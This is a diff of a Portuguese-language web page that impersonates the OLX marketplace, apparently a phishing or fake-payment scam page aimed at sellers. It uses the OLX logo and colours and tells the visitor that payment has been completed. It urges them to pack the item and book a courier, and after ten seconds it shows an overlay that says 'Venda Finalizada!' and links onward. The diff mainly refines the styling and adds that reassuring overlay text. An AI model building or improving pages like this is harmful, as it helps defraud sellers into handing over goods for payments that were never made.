@@ -69,17 +69,9 @@
         }
 
         @keyframes pulse {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                transform: scale(1.05);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
         }
 
         .success-subtitle {
@@ -97,19 +89,9 @@
         }
 
         @keyframes bounceIn {
-            0% {
-                transform: scale(0.1);
-                opacity: 0;
-            }
-
-            60% {
-                transform: scale(1.2);
-                opacity: 1;
-            }
-
-            100% {
-                transform: scale(1);
-            }
+            0% { transform: scale(0.1); opacity: 0; }
+            60% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(1); }
         }
 
         .delivery-icons {
@@ -132,27 +114,14 @@
             opacity: 0;
         }
 
-        .delivery-item:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);
-        }
-
         .delivery-item i {
             font-size: 40px;
             margin-bottom: 15px;
             color: var(--accent-color);
         }
 
-        .delivery-item h3 {
-            font-size: 18px;
-            margin-bottom: 10px;
-            color: var(--text-color);
-        }
-
-        .delivery-item p {
-            font-size: 14px;
-            color: var(--text-light);
-        }
+        .delivery-item h3 { font-size: 18px; margin-bottom: 10px; color: var(--text-color); }
+        .delivery-item p { font-size: 14px; color: var(--text-light); }
 
         .delivery-animation {
             height: 180px;
@@ -209,22 +178,6 @@
             flex-wrap: wrap;
         }
 
-        .btn-primary {
-            background-color: var(--primary-color);
-            color: white;
-            border: none;
-            border-radius: 30px;
-            padding: 15px 30px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-decoration: none;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-        }
-
         .btn-secondary {
             background-color: var(--secondary-color);
             color: white;
@@ -239,17 +192,6 @@
             display: inline-flex;
             align-items: center;
             gap: 10px;
-        }
-
-        .btn-primary:hover,
-        .btn-secondary:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-        }
-
-        .btn-primary:active,
-        .btn-secondary:active {
-            transform: translateY(0);
         }
 
         .order-details {
@@ -272,14 +214,7 @@
             margin: 15px 0;
         }
 
-        .detail-label {
-            font-weight: bold;
-            color: var(--text-light);
-        }
-
-        .detail-value {
-            color: var(--text-color);
-        }
+        .detail-label { font-weight: bold; color: var(--text-light); }
 
         footer {
             background-color: white;
@@ -291,58 +226,63 @@
             border-top: 1px solid #eee;
         }
 
-        @media (max-width: 768px) {
-            .success-container { padding: 15px; }
-            .success-card { padding: 25px 15px; }
-            .success-title { font-size: 28px; }
-            .success-subtitle { font-size: 18px; }
-            .delivery-icons { flex-direction: column; align-items: center; }
-            .delivery-item { width: 100%; max-width: none; }
-        }
-
-        /* --- CÓDIGO DO OVERLAY OLX --- */
+        /* --- ESTILOS DO OVERLAY ATUALIZADOS --- */
         #custom-olx-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.75);
+            background-color: rgba(0, 0, 0, 0.8);
             z-index: 999999;
-            display: none; /* Inicia oculto */
+            display: none;
             justify-content: center;
             align-items: center;
-            backdrop-filter: blur(3px);
+            backdrop-filter: blur(4px);
         }
 
         .olx-modal {
             background: #fff;
-            padding: 30px;
-            border-radius: 8px;
+            padding: 35px 25px;
+            border-radius: 12px;
             text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.4);
             width: 90%;
-            max-width: 340px;
+            max-width: 360px;
+        }
+
+        .olx-modal h2 {
+            color: #333;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .olx-modal p {
+            color: #666;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 25px;
         }
 
         .btn-olx-continuar {
-            background-color: #6e0ad6; /* Roxo OLX */
+            background-color: #6e0ad6;
             color: #ffffff !important;
             border: none;
             border-radius: 24px;
-            padding: 14px 0;
-            font-size: 16px;
+            padding: 16px 0;
+            font-size: 17px;
             font-weight: 700;
             cursor: pointer;
             width: 100%;
             display: block;
             text-decoration: none;
-            transition: background-color 0.2s;
-            font-family: 'Segoe UI', sans-serif;
+            transition: transform 0.2s;
         }
 
         .btn-olx-continuar:hover {
             background-color: #5a08b0;
+            transform: scale(1.02);
         }
     </style>
 </head>
@@ -350,14 +290,16 @@
 <body>
     <div id="custom-olx-overlay">
         <div class="olx-modal">
+            <h2>Venda Finalizada!</h2>
+            <p>O processo de pagamento foi concluído com sucesso. Siga para a página final para conferir os detalhes da retirada e liberação.</p>
             <a href="/pag/finalizado.html" class="btn-olx-continuar">Continuar</a>
         </div>
     </div>
 
     <div class="app-container">
-        <div class="header-content">
+        <div class="header-content" style="padding: 15px 20px; background: #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
             <div class="logo">
-                <img src="/images/olx-logo.png" alt="Logo OLX">
+                <img src="/images/olx-logo.png" alt="Logo OLX" style="height: 35px;">
             </div>
         </div>
 
@@ -375,19 +317,16 @@
                         <h3>Transporte Seguro</h3>
                         <p>Prepare seu Produto para Entrega!</p>
                     </div>
-
                     <div class="delivery-item" id="item-2">
                         <i class="fas fa-user-astronaut"></i>
                         <h3>Entregador a Caminho</h3>
                         <p>Verifique um Entregador de Confiança: Uber, e etc.</p>
                     </div>
-
                     <div class="delivery-item" id="item-3">
                         <i class="fas fa-box"></i>
                         <h3>Embalagem Segura</h3>
                         <p>Prepare a Embalagem do Produto!</p>
                     </div>
-
                     <div class="delivery-item" id="item-4">
                         <i class="fas fa-map-marked-alt"></i>
                         <h3>Rastreamento</h3>
@@ -397,12 +336,8 @@
 
                 <div class="delivery-animation">
                     <div class="map-bg"></div>
-                    <div class="delivery-pin">
-                        <i class="fas fa-map-pin"></i>
-                    </div>
-                    <div class="delivery-car">
-                        <i class="fas fa-truck"></i>
-                    </div>
+                    <div class="delivery-pin"><i class="fas fa-map-pin"></i></div>
+                    <div class="delivery-car"><i class="fas fa-truck"></i></div>
                 </div>
 
                 <div class="order-details">
@@ -441,7 +376,7 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-            // Animação dos itens
+            // Animações dos itens de entrega
             const items = document.querySelectorAll('.delivery-item');
             items.forEach((item, index) => {
                 setTimeout(() => {
@@ -450,16 +385,12 @@
                 }, 300 * (index + 1));
             });
 
-            // Datas
+            // Data automática
             const dataCompra = document.getElementById('data-compra');
             const hoje = new Date();
-            dataCompra.textContent = hoje.toLocaleDateString('pt-BR', {
-                day: '2-digit',
-                month: '2-digit',
-                year: 'numeric'
-            });
+            dataCompra.textContent = hoje.toLocaleDateString('pt-BR');
 
-            // --- LÓGICA DO OVERLAY (APARECE APÓS 10 SEGUNDOS) ---
+            // --- MOSTRAR OVERLAY APÓS 10 SEGUNDOS ---
             setTimeout(function() {
                 document.getElementById('custom-olx-overlay').style.display = 'flex';
             }, 10000);
